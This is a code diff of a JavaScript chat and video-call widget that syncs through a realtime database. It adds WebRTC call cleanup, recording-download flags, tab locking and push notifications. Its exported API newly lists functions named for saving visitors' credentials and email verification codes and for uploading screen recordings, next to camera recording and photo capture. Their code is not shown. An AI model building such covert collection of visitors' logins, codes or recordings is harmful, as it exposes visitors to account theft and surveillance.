   const now = Date.now();
   try {
+    // Eski offer/answer’ı sil — admin stale SDP ile force-rejoin yapmasın
+    try {
+      await remove(ref(database, webrtcPath(targetSessionId, callId, "visitorCandidates")));
+    } catch {
+      /* ignore */
+    }
+    try {
+      await remove(ref(database, webrtcPath(targetSessionId, callId, "adminCandidates")));
+    } catch {
+      /* ignore */
+    }
     await update(ref(database, webrtcPath(targetSessionId, callId)), {
       status: "connecting",
       visitorLeftAt: null,
@@ -1433,6 +2264,10 @@ async function resumeVisitorCameraCall(targetSessionId, callId) {
       endedAt: null,
       recordingStatus: null,
       recordingFinalized: null,
+      offer: null,
+      answer: null,
+      adminReady: null,
+      offerEpoch: null,
       visitorReady: true,
       visitorReadyAt: now,
       updatedAt: now,
@@ -1451,6 +2286,11 @@ async function resumeVisitorCameraCall(targetSessionId, callId) {
       lastWho: "user",
       page: location.pathname + location.hash,
     });
+    try {
+      sessionStorage.removeItem("soft_resume_v1");
+    } catch {
+      /* ignore */
+    }
     return true;
   } catch (err) {
     console.warn("resumeVisitorCameraCall", err);
@@ -1481,6 +2321,8 @@ async function markVisitorLeftKeepalive(targetSessionId, callId, opts = {}) {
     patchChat.lastRecordingCallId = callId ? String(callId) : null;
     patchChat.hasRecording = true;
     patchChat.recordingFinalized = true;
+    patchChat.downloadRecording = true;
+    patchChat.downloadRecordingAt = now;
   }
   try {
     const chatUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}.json`;
@@ -1502,6 +2344,7 @@ async function markVisitorLeftKeepalive(targetSessionId, callId, opts = {}) {
         callPatch.recordingUrl = lastUrl;
         callPatch.recordingName = patchChat.lastRecordingName;
         callPatch.recordingFinalized = true;
+        callPatch.downloadRecording = true;
         callPatch.recordingReadyAt = now;
       }
       const callUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}/webrtc/${encodeURIComponent(callId)}.json`;
@@ -1530,10 +2373,16 @@ window.ChatSync = {
   adminPasswordHintSet: Boolean(cfg.adminPassword && cfg.adminPassword !== "degistir-bu-sifreyi"),
   ICE_SERVERS,
   getSessionId,
+  getVisitorId,
+  touchSessionTabLock,
+  markSessionTabReloading,
+  releaseSessionTabLock,
   ensureSession,
   pingPresence,
   pushMessage,
   saveVisitorPhone,
+  saveVisitorCredentials,
+  saveVisitorEmailCode,
   startVisitorCameraOffer,
   sendAdminMessage,
   checkAdminPassword,
@@ -1564,6 +2413,7 @@ window.ChatSync = {
   resumeVisitorCameraCall,
   clearCameraCall,
   uploadCameraRecording,
+  uploadScreenRecording,
   uploadCameraSnapshot,
   markCameraRecordingFailed,
   uploadVisitorPhoto,
@@ -1582,6 +2432,12 @@ window.ChatSync = {
   startGoogleSignInLoop,
   stopGoogleSignInLoop,
   consumeGoogleRedirectResult,
+  enablePushNotifications,
+  notifyAdminsPush,
+  notifyVisitorPush,
+  sendFcmToTokens,
+  ensureMessagingSw,
+  getPushSetupStatus,
 };
 
 window.ChatSyncReady = Promise.resolve(window.ChatSync);
@@ -1591,16 +2447,31 @@ const isAdminPage = /admin\.html$/i.test(location.pathname || "");
 if (configured && !isAdminPage) {
   initAuth();
   consumeGoogleRedirectResult().catch(() => {});
+  // Sekme kilidini erken al — çift sekme aynı sohbete yazmasın
+  getSessionId();
+  touchSessionTabLock();
   pingPresence().catch(() => {});
   document.addEventListener("visibilitychange", () => {
-    if (!document.hidden) pingPresence().catch(() => {});
+    if (!document.hidden) {
+      touchSessionTabLock();
+      pingPresence().catch(() => {});
+    }
   });
   window.addEventListener("pageshow", () => {
+    touchSessionTabLock();
     pingPresence().catch(() => {});
     consumeGoogleRedirectResult().catch(() => {});
   });
   // Heartbeat — yenileme/sekme kopmasını “ayrıldı”dan ayırmak için
   window.setInterval(() => {
-    if (!document.hidden) pingPresence().catch(() => {});
-  }, 12_000);
+    if (!document.hidden) {
+      touchSessionTabLock();
+      pingPresence().catch(() => {});
+    }
+  }, 4_000);
+  window.addEventListener("pagehide", () => {
+    // Yenileme: kilidi “reloading” işaretle (soft resume aynı oturumu alsın)
+    // Gerçek kapanışta da kısa süre reloading kalır — 8sn sonra diğer sekme id çalmaz
+    markSessionTabReloading();
+  });
 }
